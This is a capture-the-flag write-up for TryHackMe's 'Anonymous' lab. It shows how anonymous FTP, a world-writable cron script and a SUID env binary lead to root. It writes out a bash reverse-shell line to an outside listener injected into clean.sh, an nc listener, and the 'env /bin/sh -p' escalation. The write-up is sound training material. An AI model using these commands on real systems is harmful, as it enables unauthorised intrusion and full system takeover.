# Anonymous — TryHackMe — Medium

> **Date:** 2026-05-30\
> **Platform:** TryHackMe\
> **Difficulty:** Medium\
> **Tags:** `#linux` `#ftp` `#smb` `#cronjob` `#suid` `#privesc`

---

## Summary

Linux machine exposing FTP with anonymous login enabled. A writable script found in the FTP share was being executed by a cron job. Injected a reverse shell into the script to gain initial access. Privilege escalation achieved via SUID `/usr/bin/env`.

---

## Reconnaissance

### Nmap scan

```bash
nmap -sC -sV -oN anonymous.txt 10.112.146.175
```

**Open ports:**

|Port|Service|Version|
|---|---|---|
|21|FTP|vsftpd 3.0.3|
|22|SSH|OpenSSH 7.6p1 Ubuntu|
|139|SMB|Samba 4.7.6-Ubuntu|
|445|SMB|Samba 4.7.6-Ubuntu|

**Notable findings:**

- FTP anonymous login allowed
- SMB message signing disabled

---

## Enumeration

### FTP Anonymous Access

```bash
ftp 10.112.146.175
# Username: anonymous
# Password: (empty)
cd scripts
ls
```

**Files found:**

|File|Permissions|Note|
|---|---|---|
|`clean.sh`|`-rwxr-xrwx`|🔴 World-writable|
|`removed_files.log`|`-rw-rw-r--`|Log updated regularly|
|`to_do.txt`|`-rw-r--r--`|Dev note|

**clean.sh contents:** Bash cleanup script running regularly via cron job.

**to_do.txt:** `I really need to disable the anonymous login...it's really not safe`

**removed_files.log:** Repeated entries → script runs every minute via cron.

---

## Exploitation

### Cron Job Hijacking via Writable FTP Script

`clean.sh` is world-writable and executed by a cron job. Replaced its content with a reverse shell:

```bash
echo '#!/bin/bash
bash -i >& /dev/tcp/10.112.171.166/4444 0>&1' > clean.sh
```

Uploaded via FTP:

```bash
ftp 10.112.146.175
cd scripts
put clean.sh
```

Started listener:

```bash
nc -lvnp 4444
```

**Result:** Shell as `namelessone` received after cron execution ✅

### Shell stabilization

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
```

---

## User Flag

```bash
cat /home/namelessone/user.txt
```

→ `THM{REDACTED}`

---

## Privilege Escalation

### SUID /usr/bin/env

```bash
find / -perm -u=s -type f 2>/dev/null
# → /usr/bin/env
```

`env` with SUID bit allows spawning a privileged shell:

```bash
/usr/bin/env /bin/sh -p
whoami
# root
```

**Result:** Root shell ✅

---

## Root Flag

```bash
cat /root/root.txt
```

→ `THM{REDACTED}`

---

## Lessons Learned

**1.** Anonymous FTP login combined with a world-writable script is a critical misconfiguration — always check file permissions and look for cron jobs when you find writable scripts.

**2.** Cron job hijacking is a powerful technique — regularly executed scripts owned or writable by low-privilege users are an instant foothold.

**3.** Always check GTFOBins for any unusual SUID binary — `/usr/bin/env` with SUID is a one-liner root escalation.

---

## Attack Chain Summary

```
nmap → FTP anonymous login
→ /scripts/clean.sh → world-writable + cron job
→ reverse shell injected → namelessone shell
→ SUID /usr/bin/env → /bin/sh -p → root
```

---

## References

- [TryHackMe - Anonymous](https://tryhackme.com/room/anonymous)
- [GTFOBins - env](https://gtfobins.github.io/gtfobins/env/)
- [HackTricks - Cron Jobs](https://book.hacktricks.xyz/linux-hardening/privilege-escalation#cron-jobs)
